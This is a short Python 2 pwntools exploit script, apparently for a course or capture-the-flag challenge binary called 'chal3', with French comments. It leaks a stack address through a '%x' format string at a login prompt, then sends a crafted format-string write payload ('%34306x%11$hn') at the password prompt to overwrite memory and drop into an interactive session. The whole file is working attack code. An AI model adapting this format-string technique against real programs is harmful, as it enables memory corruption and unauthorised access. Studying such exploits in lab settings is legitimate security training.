#!/usr/bin/env python2
# encoding: utf-8
from pwn import *
import argparse

parser = argparse.ArgumentParser("Template d'exploitation SLO level3")
parser.add_argument('--file', '-f', type=str, default="./chal3", help="name of the binary to exploit")
parser.add_argument('--host', type=str, default='10.192.72.221', help='IP remote')
parser.add_argument('--port', '-p', type=int, help='Remote port')
parser.add_argument('--remote', '-r', default=False, action='store_true', help='Enable remote connection')
parser.add_argument('--debug', '-d', default=False, action='store_true', help='Set pwntools log level to debug')
parser.add_argument('--gdb', '-g', default=False, action='store_true', help='Start gdb')

args = parser.parse_args()

if args.debug:
    context.log_level = 'DEBUG'

if args.remote:
    if args.port is None:
        log.warn('Port required for remote execution')
        sys.exit(-1)
    r = remote(args.host, args.port)

else:
    #r = ELF(args.file)
    r = process(args.file)
    if args.gdb:
        gdb.attach(r, ''' break main ''')


#get the value of the function

payload = "%x" #* 11

#affichage mémoire
#0xfff24698:	0x80485e6	0x41414141	0xf7007825	0xf7f4467d


r.sendlineafter('Login : ', payload)

retour = r.recvline()
retour = "0x" + retour

#pour vérification
#print (retour)

#On retouve l'adresse de function
functionAdresse = int(retour, 16)
functionAdresse = functionAdresse - 0x4
adressPayload = p32(functionAdresse)

payload = adressPayload+"%34306x%11$hn"

r.sendlineafter('Password :', payload)

r.interactive()
r.close()

